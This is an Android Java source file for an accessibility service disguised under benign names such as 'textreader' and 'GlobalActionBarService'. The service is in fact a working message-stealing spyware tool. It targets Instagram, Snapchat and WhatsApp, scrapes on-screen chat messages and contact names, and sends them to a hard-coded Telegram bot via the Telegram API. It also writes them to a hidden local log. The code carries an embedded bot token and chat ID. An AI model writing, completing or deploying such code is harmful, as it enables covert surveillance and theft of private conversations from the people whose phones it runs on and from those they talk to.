package com.example.textreader;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

public class GlobalActionBarService extends AccessibilityService {

    private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    // 🔥 REPLACE WITH YOUR REAL TOKEN AND CHAT ID
    private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";
    private static final String CHAT_ID = "5465116744";

    // Cache to avoid sending the same data repeatedly
    private String lastSentHash = "";

    // Blacklist of UI junk to ignore
    private Set<String> uiJunk = new HashSet<String>() {{
        add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
        add("Delete"); add("Copy"); add("Reply"); add("Forward"); add("Settings");
        add("Search"); add("Type a message"); add("New message"); add("Seen");
        add("Delivered"); add("Read"); add("Like"); add("Comment"); add("Share");
        add("Save"); add("Cancel"); add("Done"); add("Edit"); add("Post");
        add("Story"); add("Home"); add("Explore"); add("Activity");
        add("Notifications"); add("Direct"); add("Inbox"); add("Create");
        add("View"); add("Reply"); add("Forward"); add("Delete");
        add("Options"); add("Menu"); add("Add"); add("Remove"); add("Block");
        add("Report"); add("Unfollow"); add("Follow"); add("Mute"); add("Hide");
        add("Active now"); add("Typing..."); add("Today"); add("Yesterday");
        add("Seen by"); add("Delivered to"); add("Read by");
        add("Message"); add("Chat"); add("Group"); add("Broadcast");
        add("View Profile"); add("View Story"); add("Reply to");
    }};

    // View IDs that are likely part of message bubbles
    private Set<String> messageViewIds = new HashSet<String>() {{
        // Instagram
        add("message_text");
        add("row_message_text");
        add("comment_text");
        add("text");
        add("message");
        // WhatsApp
        add("message_text");
        add("conversation_row_text");
        add("status_message");
        // Snapchat
        add("chat_message_text");
        add("message_bubble");
        add("snap_text");
    }};

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        sendToTelegram("✅ Screen Logger service started successfully!");
        writeToFile("Service started at " + dateFormat.format(new Date()));
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();

        // Target only Instagram, Snapchat, WhatsApp
        if (!pkg.equals("com.instagram.android") &&
            !pkg.equals("com.snapchat.android") &&
            !pkg.equals("com.whatsapp")) {
            return;
        }

        // Only scrape when screen content changes (new message or scroll)
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                // Extract structured chat data
                ChatData chatData = extractChatData(root, pkg);
                if (chatData != null && !chatData.messages.isEmpty()) {
                    // Build a clean, structured output
                    StringBuilder logBuilder = new StringBuilder();
                    logBuilder.append(String.format("[%s] APP: %s\n", dateFormat.format(new Date()), getAppName(pkg)));
                    if (chatData.contactName != null && !chatData.contactName.isEmpty()) {
                        logBuilder.append("👤 Chat with: ").append(chatData.contactName).append("\n");
                    }
                    logBuilder.append("─────────────────────\n");
                    for (Message msg : chatData.messages) {
                        logBuilder.append("  ").append(msg.sender).append(": ").append(msg.text).append("\n");
                    }

                    String fullLog = logBuilder.toString().trim();
                    // Generate a hash of the full log to detect duplicates
                    String hash = Integer.toHexString(fullLog.hashCode());
                    if (!hash.equals(lastSentHash)) {
                        lastSentHash = hash;
                        sendToTelegram(fullLog);
                        writeToFile(fullLog);
                    }
                }
            }
        }
    }

    /**
     * Represents a single message with sender and text
     */
    private static class Message {
        String sender;
        String text;
        Message(String sender, String text) {
            this.sender = sender;
            this.text = text;
        }
    }

    /**
     * Represents the full chat data (contact name + list of messages)
     */
    private static class ChatData {
        String contactName;
        List<Message> messages = new ArrayList<>();
    }

    private ChatData extractChatData(AccessibilityNodeInfo root, String pkg) {
        ChatData chatData = new ChatData();

        // Try to find contact name
        String contactName = findContactName(root, pkg);
        chatData.contactName = contactName;

        // Find message bubbles and extract text + sender
        List<Message> messages = extractMessagesFromBubbles(root, pkg);
        chatData.messages = messages;

        return chatData;
    }

    private String findContactName(AccessibilityNodeInfo root, String pkg) {
        // Search for nodes that typically contain the contact name
        String[] nameViewIds = {
            "com.instagram.android:id/row_user_name",
            "com.instagram.android:id/comment_user_name",
            "com.instagram.android:id/username_text_view",
            "com.whatsapp:id/contact_name",
            "com.whatsapp:id/conversation_contact_name",
            "com.snapchat.android:id/chat_name",
            "com.snapchat.android:id/contact_name"
        };

        for (String viewId : nameViewIds) {
            String found = findTextByViewId(root, viewId);
            if (found != null && !found.isEmpty()) {
                return found;
            }
        }

        // Fallback: look for any large text at the top of the screen (likely a name)
        return findLargeText(root);
    }

    private String findTextByViewId(AccessibilityNodeInfo node, String targetViewId) {
        if (node == null) return null;
        if (node.getViewIdResourceName() != null) {
            String viewId = node.getViewIdResourceName();
            if (viewId.equals(targetViewId) && node.getText() != null) {
                return node.getText().toString();
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                String result = findTextByViewId(child, targetViewId);
                if (result != null) return result;
            }
        }
        return null;
    }

    private String findLargeText(AccessibilityNodeInfo root) {
        // Look for text that is likely a name (not a message)
        List<String> candidates = new ArrayList<>();
        collectLargeText(root, candidates, 0);
        if (candidates.isEmpty()) return null;
        // Pick the shortest candidate (often the name is displayed prominently)
        String best = candidates.get(0);
        for (String c : candidates) {
            if (c.length() < best.length()) best = c;
        }
        return best;
    }

    private void collectLargeText(AccessibilityNodeInfo node, List<String> list, int depth) {
        if (node == null) return;
        if (node.getText() != null) {
            String text = node.getText().toString().trim();
            // Names are usually not too long (2-20 characters) and don't contain common message patterns
            if (text.length() > 1 && text.length() < 25 && !uiJunk.contains(text) && !containsJunk(text) && !containsTimestamp(text)) {
                list.add(text);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collectLargeText(child, list, depth + 1);
        }
    }

    private List<Message> extractMessagesFromBubbles(AccessibilityNodeInfo root, String pkg) {
        List<Message> messages = new ArrayList<>();

        // Find all message bubbles
        List<AccessibilityNodeInfo> bubbles = findMessageBubbles(root, pkg);

        for (AccessibilityNodeInfo bubble : bubbles) {
            // Extract message text
            String msgText = extractMessageText(bubble);
            if (msgText == null || msgText.isEmpty()) continue;

            // Try to identify sender
            String sender = "Unknown";
            if (pkg.equals("com.instagram.android") || pkg.equals("com.whatsapp")) {
                // Look for sender name in the bubble
                String name = findSenderNameInBubble(bubble);
                if (name != null) sender = name;
            }

            // Clean the message text
            msgText = cleanMessage(msgText);
            if (msgText.isEmpty()) continue;

            // Add to list
            messages.add(new Message(sender, msgText));
        }

        return messages;
    }

    private List<AccessibilityNodeInfo> findMessageBubbles(AccessibilityNodeInfo root, String pkg) {
        List<AccessibilityNodeInfo> bubbles = new ArrayList<>();
        traverseForBubbles(root, bubbles, pkg);
        return bubbles;
    }

    private void traverseForBubbles(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> list, String pkg) {
        if (node == null) return;

        // Check if this node is a message bubble
        if (isMessageBubble(node, pkg)) {
            list.add(node);
            return; // Don't go deeper into this bubble to avoid duplicate text
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) traverseForBubbles(child, list, pkg);
        }
    }

    private boolean isMessageBubble(AccessibilityNodeInfo node, String pkg) {
        if (node == null) return false;

        String viewId = node.getViewIdResourceName();
        if (viewId != null) {
            // WhatsApp bubbles
            if (viewId.contains("message_row")) return true;
            if (viewId.contains("bubble")) return true;
            // Instagram bubbles
            if (viewId.contains("row_message")) return true;
            if (viewId.contains("comment_row")) return true;
            // Snapchat bubbles
            if (viewId.contains("chat_bubble")) return true;
            if (viewId.contains("message_bubble")) return true;

            // Check if viewId ends with common message identifiers
            for (String id : messageViewIds) {
                if (viewId.endsWith(id)) return true;
            }
        }

        // Heuristic: if this node has text and is inside a list, and has a specific depth
        // We'll also check if it has a child with a name
        return false;
    }

    private String extractMessageText(AccessibilityNodeInfo bubble) {
        // Try to find text in the bubble, prioritizing specific view IDs
        String[] messageTextIds = {
            "text",
            "message_text",
            "row_message_text",
            "comment_text",
            "bubble_text",
            "status_message"
        };

        for (String id : messageTextIds) {
            String text = findTextByViewId(bubble, id);
            if (text != null && !text.isEmpty()) {
                return text;
            }
        }

        // If not found, collect all text in the bubble and concatenate
        StringBuilder sb = new StringBuilder();
        collectAllTexts(bubble, sb);
        return sb.toString();
    }

    private String findSenderNameInBubble(AccessibilityNodeInfo bubble) {
        // Look for sender name within this bubble's children
        String[] nameIds = {
            "row_user_name",
            "comment_user_name",
            "username_text_view",
            "from_name",
            "sender_name"
        };

        for (String id : nameIds) {
            String name = findTextByViewId(bubble, id);
            if (name != null && !name.isEmpty()) {
                return name;
            }
        }

        // If the bubble is a WhatsApp message from the other person, the name might be in a sibling
        // We'll check if the bubble has a child with "from" in its ID
        return null;
    }

    private void collectAllTexts(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        if (node.getText() != null) {
            String text = node.getText().toString();
            if (!text.isEmpty()) {
                if (sb.length() > 0) sb.append(" ");
                sb.append(text);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collectAllTexts(child, sb);
        }
    }

    private String cleanMessage(String msg) {
        // Remove common garbage
        msg = msg.replaceAll("\\s+", " ").trim();
        // If the message is just "Seen" or "Delivered", ignore it
        if (uiJunk.contains(msg)) return "";
        if (msg.matches(".*\\d{1,2}:\\d{2}.*")) return ""; // timestamp
        if (msg.matches(".*(AM|PM).*")) return "";
        return msg;
    }

    private boolean containsJunk(String text) {
        for (String junk : uiJunk) {
            if (text.contains(junk)) return true;
        }
        return false;
    }

    private boolean containsTimestamp(String text) {
        return text.matches(".*\\d{1,2}:\\d{2}.*") ||
               text.matches(".*\\d{1,2}[mh] .*") ||
               text.matches(".*(AM|PM).*") ||
               text.matches(".*\\d+\\s*(sec|min|hour).*");
    }

    private String getAppName(String pkg) {
        if (pkg.equals("com.instagram.android")) return "INSTAGRAM";
        if (pkg.equals("com.snapchat.android")) return "SNAPCHAT";
        if (pkg.equals("com.whatsapp")) return "WHATSAPP";
        return pkg;
    }

    // ---------- Telegram Sender ----------
    private void sendToTelegram(final String message) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                            "/sendMessage?chat_id=" + CHAT_ID +
                            "&text=" + URLEncoder.encode(message, "UTF-8");
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);
                    int responseCode = conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    writeToFile("Telegram error: " + e.toString());
                }
            }
        }).start();
    }

    // ---------- Local Logging ----------
    private void writeToFile(String text) {
        try {
            File logFile = new File(getFilesDir(), "debug_log.txt");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.write(text + "\n");
            writer.flush();
            writer.close();
        } catch (Exception e) {
            // ignore
        }
    }

    @Override
    public void onInterrupt() {}
}
